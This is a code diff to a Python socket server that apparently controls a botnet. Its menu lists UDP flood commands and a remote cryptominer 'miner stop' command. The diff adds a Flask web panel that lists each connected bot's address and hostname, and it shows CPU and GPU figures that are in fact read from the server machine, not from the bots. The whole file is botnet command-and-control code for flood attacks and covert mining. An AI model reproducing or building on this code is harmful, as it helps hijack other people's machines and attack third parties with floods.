@@ -1,17 +1,24 @@
+from flask import Flask, render_template
+import GPUtil, psutil
+
 import threading
+import platform
 import socket
 import time
-import sys
-import os
+import sys, os
 
 host = "127.0.0.1"
 port = 65535
+
+web_port = 4444
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 s.bind((host, port))
 
 clients = []
+
+app = Flask(__name__)
 
 
 class Color:
@@ -63,6 +70,7 @@ methods = """\033[90m
   -/-\033[35m l4 udp stop \033[90m-/-
 """
 
+
 print(banner)
 
 if sys.platform == "linux":
@@ -107,6 +115,40 @@ def ping():
                     clients.remove(client)
 
 
+def get_host_info(client):
+    client_address = client.getpeername()[0]
+    host_name = socket.gethostbyaddr(client_address)[0]
+
+    cpu_name = platform.processor()
+    cpu_percent = psutil.cpu_percent()
+
+    try:
+        gpu_info = GPUtil.getGPUs()[0]
+        gpu_name = gpu_info.name
+        gpu_percent = gpu_info.memoryUtil * 100
+    except:
+        gpu_name = None
+        gpu_percent = None
+
+    host_info = (client_address, host_name, cpu_name, cpu_percent, gpu_name, gpu_percent)
+
+    return host_info
+
+
+@app.route("/")
+def index():
+    host_info_list = []
+    for client in clients:
+        host_info = get_host_info(client)
+        host_info_list.append(host_info)
+
+    return render_template("index.html", host_info_list=host_info_list)
+
+
+def app_run():
+    app.run(port=web_port)
+
+
 t = threading.Thread(target=listen)
 t.start()
 
@@ -114,6 +156,9 @@ t = threading.Thread(target=ping)
 t.start()
 
 t = threading.Thread(target=title)
+t.start()
+
+t = threading.Thread(target=app_run)
 t.start()
 
 
@@ -170,11 +215,11 @@ def server():
 
                             data = client.recv(1024).decode()
 
-                            if data == "Running":
-                                print("\033[32mRunning\033[0m")
+                            if data == "Active":
+                                print("\033[32mActive\033[0m")
 
-                            elif data == "Not Running":
-                                print("\033[31mNot Running\033[0m")
+                            elif data == "Inactive":
+                                print("\033[31mInactive\033[0m")
 
                     # Miner
                     elif console == "miner stop":
@@ -261,4 +306,5 @@ def clear():
     print(banner)
 
 
+clear()
 server()
